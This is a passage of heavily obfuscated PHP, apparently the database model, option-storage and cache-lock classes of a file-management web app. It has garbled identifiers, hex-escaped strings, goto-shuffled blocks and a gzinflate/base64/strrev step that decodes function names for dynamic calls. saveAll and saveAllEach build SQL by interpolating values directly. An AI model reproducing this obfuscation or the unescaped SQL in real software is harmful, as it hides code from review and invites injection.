public function saveAll($ÜêöªÏÛ) { $õüø”™ï =& $_SERVER[ÕŸ²ó÷å]; $ÓÖĞ¨‚ª = $this->tablePrefix . $this->tableName; $Ü¤ªİÛÄ = self::SQL_WHERE_IN_CHUNK; $ÜêöªÏÛ = is_array($ÜêöªÏÛ) ? $ÜêöªÏÛ : array(); $ìÏ‚Óòì = $õüø”™ï[463]; $ìè·ı¸ = 0; $‚ÜÏ†³ = array(); $õ‚ºÖ±Ğ = count($ÜêöªÏÛ); for ($Š—šÇà” = 0; $Š—šÇà” < $õ‚ºÖ±Ğ; $Š—šÇà”++) { $îà´üú = $ÜêöªÏÛ[$Š—šÇà”]; if (!is_array($îà´üú) || count($îà´üú) != 4) { continue; } $”ï‘Ô¡Â = "\x55\x50\104\101\x54\105\x20\140{$ÓÖĞ¨‚ª}\x60\40\x53\105\124\x20{$îà´üú[2]}\x20\75\40\103\101\123\x45\40{$îà´üú[0]}\x20\xa"; if ($ìè·ı¸ == 0) { $ìÏ‚Óòì = $”ï‘Ô¡Â; } $‚ÜÏ†³[] = $õüø”™ï[131] . $îà´üú[1] . $õüø”™ï[131]; $ìè·ı¸++; $ìÏ‚Óòì .= "\40\127\x48\105\116\40\x27{$îà´üú[1]}\47\x20\124\x48\x45\x4e\x20\x27{$îà´üú[3]}\x27\40\xa"; if ($ìè·ı¸ == $Ü¤ªİÛÄ || $Š—šÇà” == $õ‚ºÖ±Ğ - 1) { $‰Ã®õçò = implode($õüø”™ï[50], $‚ÜÏ†³); $ìÏ‚Óòì .= "\40\105\116\x44\40\x20\127\110\x45\x52\105\40{$îà´üú[0]}\40\x49\116\40\x28{$‰Ã®õçò}\51\40"; $this->execute($ìÏ‚Óòì); $ìè·ı¸ = 0; $ìÏ‚Óòì = $”ï‘Ô¡Â; $this->chunkEventCheck(count($‚ÜÏ†³)); $‚ÜÏ†³ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ ³´¦¼) { $Â¬›€öó =& $_SERVER[ÕŸ²ó÷å]; $şÜ¥Îø— = $this->tablePrefix . $this->tableName; foreach ($ ³´¦¼ as $ÚµÉåï) { if (!is_array($ÚµÉåï) || count($ÚµÉåï) != 4) { continue; } $Ö€­ï¬Á = $ÚµÉåï[0] . $Â¬›€öó[464] . $ÚµÉåï[1] . $Â¬›€öó[131]; $ğ¨ğ°„³ = $ÚµÉåï[2] . $Â¬›€öó[464] . $ÚµÉåï[3] . $Â¬›€öó[131]; $ŒÂ¢‰çÉ = "\165\x70\x64\x61\164\145\40{$şÜ¥Îø—}\x20\x73\x65\x74\40{$ğ¨ğ°„³}\40\167\x68\x65\162\x65\x20{$Ö€­ï¬Á}\x3b"; $this->execute($ŒÂ¢‰çÉ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($é×¤«¶ñ = false, $ÂÜğöŞ´ = false) { $this->_chunkEvent = $é×¤«¶ñ; $this->_chunkEventParam = $ÂÜğöŞ´; } private function chunkEventCheck($«æÃåÜÌ) { if (!$this->_chunkEvent) { return; } $¡£‚ï‰Š = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¡£‚ï‰Š[$_SERVER[ÕŸ²ó÷å][465]] = $«æÃåÜÌ; Hook::trigger($this->_chunkEvent, $¡£‚ï‰Š); } public function addAll($¯ÏêøóÓ, $‘ºıÁ¿£ = array(), $ÀªÏãÕ£ = false) { $ğØ¨£Ğ¶ =& $_SERVER[ÕŸ²ó÷å]; ignore_timeout(); $´²ÛáÕÏ = self::SQL_WHERE_IN_CHUNK; if (empty($¯ÏêøóÓ)) { $this->error = think_lang($ğØ¨£Ğ¶[357]); return !1; } $‘ºıÁ¿£ = $this->_parseOptions($‘ºıÁ¿£); foreach ($¯ÏêøóÓ as $§ìè… è => $ªìä¨À) { $¯ÏêøóÓ[$§ìè… è] = $this->_facade($ªìä¨À); $this->_beforeInsert($¯ÏêøóÓ[$§ìè… è], $‘ºıÁ¿£); } if (method_exists($this->db, $ğØ¨£Ğ¶[358])) { for ($ÊßÁÛ‰µ = 0; $ÊßÁÛ‰µ < count($¯ÏêøóÓ); $ÊßÁÛ‰µ += $´²ÛáÕÏ) { $©Íƒûã = array_slice($¯ÏêøóÓ, $ÊßÁÛ‰µ, $´²ÛáÕÏ); if (!is_array($©Íƒûã) || count($©Íƒûã) == 0) { break; } $İñ»´º = $this->db->insertAll($©Íƒûã, $‘ºıÁ¿£, $ÀªÏãÕ£); $this->chunkEventCheck(count($©Íƒûã)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¯ÏêøóÓ as $§ìè… è => $ªìä¨À) { $İñ»´º = $this->db->insert($ªìä¨À, $‘ºıÁ¿£, $ÀªÏãÕ£); } $this->commit(); } if (!1 !== $İñ»´º) { $îÀÖø¹» = $this->getLastInsID(); if ($îÀÖø¹») { return $îÀÖø¹»; } } return $İñ»´º; } public function save($ÆŠç’¸Ô = '', $ê¿•åÄ¼ = array()) { $¸Ï«ÔŒ =& $_SERVER[ÕŸ²ó÷å]; $¹±áƒ™ = self::SQL_WHERE_IN_CHUNK; $É‡ôúòº = $this->optionsValue(); $…ß©Úû© = $this->findWhereField($É‡ôúòº); if (!$…ß©Úû©) { return parent::save($ÆŠç’¸Ô, $ê¿•åÄ¼); } $äÏ±«Èø = 0; $Üæ§ëİ = $É‡ôúòº[$¸Ï«ÔŒ[361]][$…ß©Úû©][1]; $Üæ§ëİ = is_array($Üæ§ëİ) ? $Üæ§ëİ : array(); $À¼¬Š£ = count($Üæ§ëİ); for ($ˆ¡ı¸„« = 0; $ˆ¡ı¸„« < $À¼¬Š£; $ˆ¡ı¸„« += $¹±áƒ™) { $¨úŠÄ¥‰ = array_slice($Üæ§ëİ, $ˆ¡ı¸„«, $¹±áƒ™); if (!is_array($¨úŠÄ¥‰) || count($¨úŠÄ¥‰) == 0) { break; } $É‡ôúòº[$¸Ï«ÔŒ[361]][$…ß©Úû©][1] = $¨úŠÄ¥‰; $this->optionsValue($É‡ôúòº); $äÏ±«Èø += parent::save($ÆŠç’¸Ô, $ê¿•åÄ¼); $this->chunkEventCheck(count($¨úŠÄ¥‰)); } $this->chunkEventSet(); return $äÏ±«Èø; } public function add($éŒ‰¤»‡ = '', $¬Ë¡‘Ş = array(), $¸ì„ìÜû = false) { if ($this->addTaskStatus && is_array($éŒ‰¤»‡)) { $this->addTaskData[] = $éŒ‰¤»‡; return; } return parent::add($éŒ‰¤»‡, $¬Ë¡‘Ş, $¸ì„ìÜû); } public function parseWhereLike($çÕèñ±, $»Ìö—Ëä = '', $ßªÏ§ = false, &$Ô©ˆë‘ä = false) { $’õ ’ä =& $_SERVER[ÕŸ²ó÷å]; $«¬­’’Ë = $GLOBALS[$’õ ’ä[6]][$’õ ’ä[466]]; if (!$«¬­’’Ë[$’õ ’ä[467]]) { return $çÕèñ±; } if (!is_array($çÕèñ±)) { return $çÕèñ±; } $ß¸”“ë´ = array(); $ğìåø¦ˆ = 0; foreach ($çÕèñ± as $ñú·¾úù => $ˆØ“µãÅ) { if (is_array($ˆØ“µãÅ) && count($ˆØ“µãÅ) == 2 && $ˆØ“µãÅ[0] == $’õ ’ä[468] && is_string($ˆØ“µãÅ[1]) && substr($ˆØ“µãÅ[1], 0, 1) == $’õ ’ä[469] && substr($ˆØ“µãÅ[1], strlen($ˆØ“µãÅ[1]) - 1, 1) == $’õ ’ä[469]) { $Ô©ˆë‘ä = !0; $Öç¤•µæ = is_string($ñú·¾úù) ? $ñú·¾úù : $»Ìö—Ëä; $¢¥¯¤‚‰ = substr($ˆØ“µãÅ[1], 1, strlen($ˆØ“µãÅ[1]) - 2); $¢¥¯¤‚‰ = $this->db->escapeString($¢¥¯¤‚‰); if (!strpos($Öç¤•µæ, $’õ ’ä[10])) { $Öç¤•µæ = $’õ ’ä[470] . $Öç¤•µæ . $’õ ’ä[470]; } $âš¬Œ˜ = $’õ ’ä[230] . $¢¥¯¤‚‰ . $’õ ’ä[230]; $¢¥¯¤‚‰ = str_replace(array($’õ ’ä[10], $’õ ’ä[471], $’õ ’ä[11]), $’õ ’ä[472], $¢¥¯¤‚‰); if ($«¬­’’Ë[$’õ ’ä[473]]) { $âš¬Œ˜ = $’õ ’ä[474] . $¢¥¯¤‚‰ . $’õ ’ä[475]; if ($«¬­’’Ë[$’õ ’ä[476]]) { $âš¬Œ˜ = $’õ ’ä[475] . $¢¥¯¤‚‰ . $’õ ’ä[474]; } } $ß¸”“ë´[$ğìåø¦ˆ] = $’õ ’ä[477] . $Öç¤•µæ . $’õ ’ä[478] . $âš¬Œ˜ . $’õ ’ä[479]; $ğìåø¦ˆ++; continue; } if (is_array($ˆØ“µãÅ)) { $»Ìö—Ëä = is_string($ñú·¾úù) ? $ñú·¾úù : $»Ìö—Ëä; $ˆØ“µãÅ = $this->parseWhereLike($ˆØ“µãÅ, $»Ìö—Ëä, !0, $Ô©ˆë‘ä); } if (is_numeric($ñú·¾úù)) { $ß¸”“ë´[$ğìåø¦ˆ] = $ˆØ“µãÅ; $ğìåø¦ˆ++; } else { $ß¸”“ë´[$ñú·¾úù] = $ˆØ“µãÅ; } } if ($Ô©ˆë‘ä && !$ßªÏ§) { } return $ß¸”“ë´; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ö’©Ò… = array()) { $ğÉº‡§¨ =& $_SERVER[ÕŸ²ó÷å]; $¼üÀÑ¿ = self::SQL_WHERE_IN_CHUNK; $×Èóù¯Í = $this->optionsValue(); $¾õÏà†– = $this->findWhereField($×Èóù¯Í); if (!$¾õÏà†– || isset($×Èóù¯Í[$ğÉº‡§¨[377]]) || isset($×Èóù¯Í[$ğÉº‡§¨[438]])) { return parent::select($Ö’©Ò…); } $™ÚƒÑğê = $×Èóù¯Í[$ğÉº‡§¨[361]][$¾õÏà†–][1]; $™ÚƒÑğê = is_array($™ÚƒÑğê) ? $™ÚƒÑğê : array(); $²ñË²‰ = null; for ($èÂâ¡ı = 0; $èÂâ¡ı < count($™ÚƒÑğê); $èÂâ¡ı += $¼üÀÑ¿) { $“¼£§ = array_slice($™ÚƒÑğê, $èÂâ¡ı, $¼üÀÑ¿); if (!is_array($“¼£§) || count($“¼£§) == 0) { break; } $×Èóù¯Í[$ğÉº‡§¨[361]][$¾õÏà†–][1] = $“¼£§; $this->optionsValue($×Èóù¯Í); $şÔƒÈ²ä = parent::select($Ö’©Ò…); if (!$şÔƒÈ²ä) { continue; } $²ñË²‰ = is_array($²ñË²‰) ? $²ñË²‰ : array(); $²ñË²‰ = array_merge($²ñË²‰, $şÔƒÈ²ä); } return $²ñË²‰; } public function delete($÷¹ÅÃƒÜ = array()) { $œï¯­‹ı =& $_SERVER[ÕŸ²ó÷å]; $÷å¢ñ› = self::SQL_WHERE_IN_CHUNK; $®±´æøÆ = $this->optionsValue(); $Îó¢¢òÅ = $this->findWhereField($®±´æøÆ); if (!$Îó¢¢òÅ) { return parent::delete($÷¹ÅÃƒÜ); } $ÆÛ§Ê— = 0; $®ØûÂå = $®±´æøÆ[$œï¯­‹ı[361]][$Îó¢¢òÅ][1]; $®ØûÂå = is_array($®ØûÂå) ? $®ØûÂå : array(); for ($é£˜Óı = 0; $é£˜Óı < count($®ØûÂå); $é£˜Óı += $÷å¢ñ›) { $˜µ¹™ë = array_slice($®ØûÂå, $é£˜Óı, $÷å¢ñ›); if (!is_array($˜µ¹™ë) || count($˜µ¹™ë) == 0) { break; } $®±´æøÆ[$œï¯­‹ı[361]][$Îó¢¢òÅ][1] = $˜µ¹™ë; $this->optionsValue($®±´æøÆ); $ÆÛ§Ê— += parent::delete($÷¹ÅÃƒÜ); } return $ÆÛ§Ê—; } private function findWhereField($÷«ÌÉŒ™) { $Ã ®”ÅÏ =& $_SERVER[ÕŸ²ó÷å]; $§Æ¼è÷ = self::SQL_WHERE_IN_CHUNK; if (!is_array($÷«ÌÉŒ™) || !is_array($÷«ÌÉŒ™[$Ã ®”ÅÏ[361]])) { return !1; } foreach ($÷«ÌÉŒ™[$Ã ®”ÅÏ[361]] as $¶ê‰€õ => $™”Ô«‰£) { if (is_array($™”Ô«‰£) && isset($™”Ô«‰£[0]) && is_string($™”Ô«‰£[0]) && strtolower($™”Ô«‰£[0]) == $Ã ®”ÅÏ[7] && is_array($™”Ô«‰£[1]) && count($™”Ô«‰£[1]) > $§Æ¼è÷) { ignore_timeout(); return $¶ê‰€õ; } } return !1; } public function setMasterDB($œ•öÓ¿ó = true) { think_config($_SERVER[ÕŸ²ó÷å][480], $œ•öÓ¿ó); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($Æ¬ÂıÃ¼ = false, $¡ŠĞÇ® = "\155\x6f\x64\x69\146\x79\124\x69\155\x65", $×áäÙ … = false) { $Ø£ÍµÂ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ù„©¦Û¯ = array_values($Ø£ÍµÂ); if ($Ù„©¦Û¯ && $Ù„©¦Û¯[0] && !is_array($Ù„©¦Û¯[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ø£ÍµÂ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ø£ÍµÂ) { return $Æ¬ÂıÃ¼ ? null : array(); } if (!$Æ¬ÂıÃ¼) { $Ø£ÍµÂ = array_filter(array_values($Ø£ÍµÂ)); return array_sort_by($Ø£ÍµÂ, $¡ŠĞÇ®, $×áäÙ …); } return $Ø£ÍµÂ[$_SERVER[ÕŸ²ó÷å][481] . $Æ¬ÂıÃ¼]; } public function insert($Îª¤Ö‹í) { $Ñ¸÷ˆÅË =& $_SERVER[ÕŸ²ó÷å]; $Îª¤Ö‹í = array_field_key($Îª¤Ö‹í, $this->field); $ÕÆà¸‹ = Model($this->modelType)->get($Ñ¸÷ˆÅË[482], $this->optionType . $Ñ¸÷ˆÅË[483]); $ÕÆà¸‹ = $ÕÆà¸‹ ? $ÕÆà¸‹ : 0; $Îª¤Ö‹í[$Ñ¸÷ˆÅË[484]] = ++$ÕÆà¸‹; $Îª¤Ö‹í[$Ñ¸÷ˆÅË[241]] = time(); $Îª¤Ö‹í[$Ñ¸÷ˆÅË[98]] = time(); Model($this->modelType)->set($Ñ¸÷ˆÅË[482], $ÕÆà¸‹, $this->optionType . $Ñ¸÷ˆÅË[483]); Model($this->modelType)->set($Ñ¸÷ˆÅË[481] . $ÕÆà¸‹, $Îª¤Ö‹í, $this->optionType); return $ÕÆà¸‹; } public function update($ŠÚÅœŒŸ, $—éÀ¨¶î) { $ú•ò¶ı =& $_SERVER[ÕŸ²ó÷å]; $—éÀ¨¶î = array_field_key($—éÀ¨¶î, $this->field); $ãİìŒ»  = $this->listData($ŠÚÅœŒŸ); if (!$ãİìŒ»  || !$ŠÚÅœŒŸ) { return !1; } $—éÀ¨¶î = array_merge($ãİìŒ» , $—éÀ¨¶î); $—éÀ¨¶î[$ú•ò¶ı[98]] = time(); return Model($this->modelType)->set($ú•ò¶ı[481] . $ŠÚÅœŒŸ, $—éÀ¨¶î, $this->optionType); } public function remove($ì´¸©‹Ã) { if (!$ì´¸©‹Ã) { return !1; } return Model($this->modelType)->remove($_SERVER[ÕŸ²ó÷å][481] . $ì´¸©‹Ã, $this->optionType); } public function clear() { $ö€©£ß =& $_SERVER[ÕŸ²ó÷å]; Model($this->modelType)->remove($ö€©£ß[482], $this->optionType . $ö€©£ß[483]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($üµàµÂ, $ş›Äèæ‡) { if (!$ş›Äèæ‡) { return !1; } $òîÜÉ¢Â = $this->listData(); $òîÜÉ¢Â = array_to_keyvalue($òîÜÉ¢Â, $üµàµÂ); return isset($òîÜÉ¢Â[$ş›Äèæ‡]) ? $òîÜÉ¢Â[$ş›Äèæ‡] : !1; } public function findByName($÷¹Á¡¢ø) { return $this->findByKey($_SERVER[ÕŸ²ó÷å][32], $÷¹Á¡¢ø); } protected function resetData($¤¬ÁœÕ) { $µ«Ê×Æñ =& $_SERVER[ÕŸ²ó÷å]; $¤¬ÁœÕ = is_array($¤¬ÁœÕ) ? $¤¬ÁœÕ : array(); $ŞåÛë®½ = array(); for ($®ÙÀ–ıı = 0; $®ÙÀ–ıı < count($¤¬ÁœÕ); $®ÙÀ–ıı++) { $ŞåÛë®½[$µ«Ê×Æñ[481] . $¤¬ÁœÕ[$®ÙÀ–ıı][$µ«Ê×Æñ[484]]] = $¤¬ÁœÕ[$®ÙÀ–ıı]; } return Model($this->modelType)->set($ŞåÛë®½, !1, $this->optionType); } private function getAutoName($­ò¤Ë¬œ) { $¦…¥¿æì = array_to_keyvalue($this->listData(), $_SERVER[ÕŸ²ó÷å][32]); if (!$¦…¥¿æì || !isset($¦…¥¿æì[$­ò¤Ë¬œ])) { return $­ò¤Ë¬œ; } for ($ü“û›…¾ = 1; $ü“û›…¾ < count($¦…¥¿æì); $ü“û›…¾++) { $Ò¾Æª¶è = $­ò¤Ë¬œ . "\x28{$ü“û›…¾}\51"; if (!isset($¦…¥¿æì[$Ò¾Æª¶è])) { return $Ò¾Æª¶è; } } return $Ò¾Æª¶è; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¨€€›êë = false, $Ó¢ºÆÏÑ = '', $•¸‹³ÀÎ = false) { $ÛÛÆ¯­Ù =& $_SERVER[ÕŸ²ó÷å]; $ÇÒå×•° = $this->cacheGet($Ó¢ºÆÏÑ); $ãØÌÀ· = $this->optionDefault($Ó¢ºÆÏÑ); $ãØÌÀ· = is_array($ãØÌÀ·) ? $ãØÌÀ· : array(); if (is_array($ÇÒå×•°)) { $ÇÒå×•° = array_merge($ãØÌÀ·, $ÇÒå×•°); return $¨€€›êë ? isset($ÇÒå×•°[$¨€€›êë]) ? $ÇÒå×•°[$¨€€›êë] : null : $ÇÒå×•°; } $íõ‰Ê²˜ = $this->filterWhere(array($ÛÛÆ¯­Ù[33] => $Ó¢ºÆÏÑ)); $ÇÒå×•° = $this->where($íõ‰Ê²˜)->select(); $ÇÒå×•° = array_to_keyvalue($ÇÒå×•°, $ÛÛÆ¯­Ù[107], $ÛÛÆ¯­Ù[459]); foreach ($ÇÒå×•° as $”¸¥‡¬ => $óó½ÍÂ) { if ($•¸‹³ÀÎ || in_array($”¸¥‡¬, $this->jsonField)) { $ÇÒå×•°[$”¸¥‡¬] = json_decode($óó½ÍÂ, !0); } } $this->cacheSet($Ó¢ºÆÏÑ, $ÇÒå×•°); $ÇÒå×•° = array_merge($ãØÌÀ·, $ÇÒå×•°); return $¨€€›êë ? $ÇÒå×•°[$¨€€›êë] : $ÇÒå×•°; } public function set($ÔŠå‡¤ä, $ƒÂºÛèî = false, $ –ÅîÊŠ = '') { $¬Ü˜µÚ€ =& $_SERVER[ÕŸ²ó÷å]; $this->cacheRemove($ –ÅîÊŠ); $ÛòèİáÍ = array(); $ˆóÄÇÄü = is_array($ÔŠå‡¤ä) ? $ÔŠå‡¤ä : array($ÔŠå‡¤ä => $ƒÂºÛèî); foreach ($ˆóÄÇÄü as $Á½Ö°½ë => $ËğÊ¡€) { if (is_array($ËğÊ¡€)) { $ËğÊ¡€ = json_encode_force($ËğÊ¡€); } $this->checkLength($ËğÊ¡€, !1, $this->tableName . $¬Ü˜µÚ€[4] . $ÔŠå‡¤ä); $ËğÊ¡€ = self::textEncode($ËğÊ¡€); $ˆóÄÇÄü = array($¬Ü˜µÚ€[33] => $ –ÅîÊŠ, $¬Ü˜µÚ€[107] => $Á½Ö°½ë, $¬Ü˜µÚ€[459] => $ËğÊ¡€); $ÛòèİáÍ[] = $this->filterWhere($ˆóÄÇÄü); } if (!$ÛòèİáÍ) { return !0; } $Å¶äº«Ê = $this->cacheKey($¬Ü˜µÚ€[485]); CacheLock::lock($Å¶äº«Ê); $ş²Ïİø– = $this->addAll($ÛòèİáÍ, array(), !0); CacheLock::unlock($Å¶äº«Ê); return $ş²Ïİø–; } protected function optionDefault($«ıƒ­¸¼ = '') { return !1; } public function setDeep($Üµù§¸, $Ğ›úğ« = false, $»ğÚ×® = '') { $çºËìô  = explode($_SERVER[ÕŸ²ó÷å][10], $Üµù§¸); $²ÛØ§ÓĞ = $this->get(); array_set_value($²ÛØ§ÓĞ, $Üµù§¸, $Ğ›úğ«); $this->set($çºËìô [0], $²ÛØ§ÓĞ[$çºËìô [0]], $»ğÚ×®); } public function remove($ãÜ‡¼şâ, $ú·ü¡¯Û = '') { $ˆ‘ÆóŠ‰ =& $_SERVER[ÕŸ²ó÷å]; $this->cacheRemove($ú·ü¡¯Û); $·Ç×ì‡ = $this->filterWhere(array($ˆ‘ÆóŠ‰[107] => $ãÜ‡¼şâ, $ˆ‘ÆóŠ‰[33] => $ú·ü¡¯Û)); if (is_null($ãÜ‡¼şâ)) { unset($·Ç×ì‡[$ˆ‘ÆóŠ‰[107]]); } return $this->where($·Ç×ì‡)->delete(); } public function cacheSet($Û¹Ç÷„º, $“à©«÷ = false) { return Cache::set($this->cacheKey($Û¹Ç÷„º), $“à©«÷); } public function cacheGet($÷àø™²Æ) { return Cache::get($this->cacheKey($÷àø™²Æ)); } public function cacheRemove($Ó³”Ââ³) { return Cache::remove($this->cacheKey($Ó³”Ââ³)); } protected function filterWhere($áŞ­®àö) { return $áŞ­®àö; } protected function cacheKey($Øá‘µ’Ù) { return $Øá‘µ’Ù; } } goto fâ¼¬âĞØŠ; D„˜¸‡ˆ¬: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $´‡êéŒÔ =& $_SERVER[ÕŸ²ó÷å]; $ø³âõß­ = $GLOBALS[$´‡êéŒÔ[6]][$´‡êéŒÔ[434]]; self::$cachePath = $ø³âõß­[$´‡êéŒÔ[240]][$´‡êéŒÔ[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¼øêËˆ‹, $Î›šÓÉÙ = 0) { $öôË”ìú =& $_SERVER[ÕŸ²ó÷å]; $‡Ç·ĞŒĞ = microtime(!0); $Şş¼¬à = $‡Ç·ĞŒĞ + $Î›šÓÉÙ + 0.0001; $Ÿ¬¸Í¢„ = rtrim(self::$cachePath, $öôË”ìú[8]) . $öôË”ìú[948] . md5($¼øêËˆ‹) . $öôË”ìú[945]; if (file_exists($Ÿ¬¸Í¢„) && filemtime($Ÿ¬¸Í¢„) && filemtime($Ÿ¬¸Í¢„) < time() - 10) { @unlink($Ÿ¬¸Í¢„); } do { if (file_exists($Ÿ¬¸Í¢„)) { cacheLockWait(); continue; } $ŠºŒÎì = fopen($Ÿ¬¸Í¢„, $öôË”ìú[949]); if (!$ŠºŒÎì) { return !1; } $»Îã± = flock($ŠºŒÎì, LOCK_EX | LOCK_NB); self::$caches[$¼øêËˆ‹] = array($öôË”ìú[950] => $ŠºŒÎì, $öôË”ìú[240] => $Ÿ¬¸Í¢„); fwrite($ŠºŒÎì, $Şş¼¬à); clearstatcache(); if ($ŠºŒÎì && $»Îã±) { return !0; } cacheLockWait(); } while (microtime(!0) < $Şş¼¬à); $this->unlock($¼øêËˆ‹); return !1; } public function lockGet($òÁ½Ù½­) { $Öºãó–ù =& $_SERVER[ÕŸ²ó÷å]; $ĞÓÆÍÑ½ = rtrim(self::$cachePath, $Öºãó–ù[8]) . $Öºãó–ù[948] . md5($òÁ½Ù½­) . $Öºãó–ù[945]; return file_exists($ĞÓÆÍÑ½); } public function unlock($€½Ò««) { $ªØùŞ… =& $_SERVER[ÕŸ²ó÷å]; $·•œŒÎ‚ = self::$caches[$€½Ò««]; if (!$·•œŒÎ‚) { return; } @flock($·•œŒÎ‚[$ªØùŞ…[950]], LOCK_UN); @fclose($·•œŒÎ‚[$ªØùŞ…[950]]); @unlink($·•œŒÎ‚[$ªØùŞ…[240]]); unset(self::$caches[$€½Ò««]); } } class CacheLockRedis { public function lock($‘õ·Šö, $“İ³ÂÀ¸ = 10) { $ìÒ–³‹· = Cache::init(); $…èèî¥œ = microtime(!0) + $“İ³ÂÀ¸; while (microtime(!0) < $…èèî¥œ) { $¥ªÙ×Û‘ = $ìÒ–³‹·->get($‘õ·Šö); if (!$¥ªÙ×Û‘) { $â¤Ø½í = $ìÒ–³‹·->setLock($‘õ·Šö, $…èèî¥œ, $“İ³ÂÀ¸); if ($â¤Ø½í) { return !0; } } else { if ($¥ªÙ×Û‘ < microtime(!0)) { $ìÒ–³‹·->set($‘õ·Šö, $…èèî¥œ, $“İ³ÂÀ¸ * 2); if ($ìÒ–³‹·->get($‘õ·Šö) === $¥ªÙ×Û‘) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($•‚Šà¤Ò) { return Cache::init()->get($•‚Šà¤Ò); } public function unlock($ˆƒ¤¥„) { return Cache::init()->remove($ˆƒ¤¥„); } } goto BÇ­íÌ±ß™; CŒóïâ×©ƒ: function binCheckBigger($úéœ“ºı, $ïÔ„İ¼á) { return $úéœ“ºı > $ïÔ„İ¼á; } $_SERVER[$_SERVER[Ğ†‡‚îƒ][3]] = ("\x38\x35\x31\x39"."\x39\x34")+0;$_w1g8="wfkchdupvslq9bgenoxz827t5yir64301amjrt6v53zjif7h89p2um1g4qsn0wledoyabkcx2an3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($÷•›Äíó, $øä§€öº) { $úË¿‰Šñ =& $_SERVER[ÕŸ²ó÷å]; if (isset(self::$_methodList[$÷•›Äíó])) { return @call_user_func_array(self::$_methodList[$÷•›Äíó], $øä§€öº); } else { if (method_exists($this, $÷•›Äíó)) { return call_user_func_array(array($this, $÷•›Äíó), $øä§€öº); } else { think_exception(__CLASS__ . $úË¿‰Šñ[4] . $÷•›Äíó . $úË¿‰Šñ[5]); } } } public static function __callStatic($‹½Ì´æ•, $Ì ´²Èª) { if (isset(self::$_methodListStatic[$‹½Ì´æ•])) { return call_user_func_array(self::$_methodListStatic[$‹½Ì´æ•], $Ì ´²Èª); } else { if (method_exists(self, $‹½Ì´æ•)) { return call_user_func_array(array(self, $‹½Ì´æ•), $Ì ´²Èª); } else { show_json("{$‹½Ì´æ•}\x28\51\40\156\x6f\x74\x20\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($£¢º¡áú, $·äµ®õÄ) { self::$_methodList[$£¢º¡áú] = $·äµ®õÄ; } public static function addMethodStatic($³Üû×ŸÆ, $•Ä°ìã) { self::$_methodListStatic[$³Üû×ŸÆ] = $•Ä°ìã; } } goto b·¨ã˜Šã; eÔùêå½ßË: define($_SERVER[ÕŸ²ó÷å][0], $_SERVER[ÕŸ²ó÷å][1]); $_SERVER[Ğ†‡‚îƒ] = explode($_SERVER[ÕŸ²ó÷å][2], gzinflate(substr($_SERVER[ÕŸ²ó÷å][3], 10, -8))); function binCheckEq($ÅŠ¸”ë·, $•ïØéÓú) { return $ÅŠ¸”ë· == $•ïØéÓú; } goto Bó£ã° ; Bó£ã° : $fileSize = strrev(base64_decode($_SERVER[Ğ†‡‚îƒ][0])); function binCheckNeq($Û„Â¤ö¼, $«ºéÑÕ) { return $Û„Â¤ö¼ != $«ºéÑÕ; } $_SERVER[$_SERVER[Ğ†‡‚îƒ][1]] = $fileSize($_SERVER[$_SERVER[Ğ†‡‚îƒ][2]]); goto CŒóïâ×©ƒ; F¿¨å›ŒÆ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x6a\157\x62\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x64\145\x73\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\154\146\112\x6f\142\x4c\x69\x73\164"; public function listData($êƒú³ = false, $óĞšƒ«Ş = "\163\157\162\x74", $Ÿ•…Ô“† = false) { return parent::listData($êƒú³, $óĞšƒ«Ş, $Ÿ•…Ô“†); } public function remove($ä“ı¸ş‡) { return parent::remove($ä“ı¸ş‡); } public function add($÷¸ùùµ) { $ÉÔÙ¡ë =& $_SERVER[ÕŸ²ó÷å]; if ($this->findByName($÷¸ùùµ[$ÉÔÙ¡ë[32]])) { return !1; } $÷¸ùùµ[$ÉÔÙ¡ë[1996]] = $this->getSort(); return parent::insert($÷¸ùùµ); } private function getSort() { $¤¢ÃâÎ¶ =& $_SERVER[ÕŸ²ó÷å]; $Ú•­· = parent::listData(); $´÷ÜÀ· = array_to_keyvalue($Ú•­·, $¤¢ÃâÎ¶[12], $¤¢ÃâÎ¶[1996]); return empty($´÷ÜÀ·) ? 0 : max($´÷ÜÀ·) + 1; } public function update($ãÔãéŒ¬, $Ò½×ÊØ) { $ÓÃæñ¸‚ =& $_SERVER[ÕŸ²ó÷å]; $”´Ğº™ = parent::listData($ãÔãéŒ¬); $¯êÙË¤Ä = $this->findByName($Ò½×ÊØ[$ÓÃæñ¸‚[32]]); if (!$”´Ğº™ || $¯êÙË¤Ä && $¯êÙË¤Ä[$ÓÃæñ¸‚[484]] != $”´Ğº™[$ÓÃæñ¸‚[484]]) { return !1; } return parent::update($ãÔãéŒ¬, $Ò½×ÊØ); } public function setUserJob($ËŸ¤ªÎ, $šÜú€Ìõ) { $°¶ßŞ„ =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($šÜú€Ìõ)) { $šÜú€Ìõ = array($šÜú€Ìõ); } $®¼œ‹Â = parent::listData(); $ÊËƒ¥¿ = array_to_keyvalue($®¼œ‹Â, $°¶ßŞ„[32]); $öàÀ€¿Ë = $°¶ßŞ„[463]; foreach ($šÜú€Ìõ as 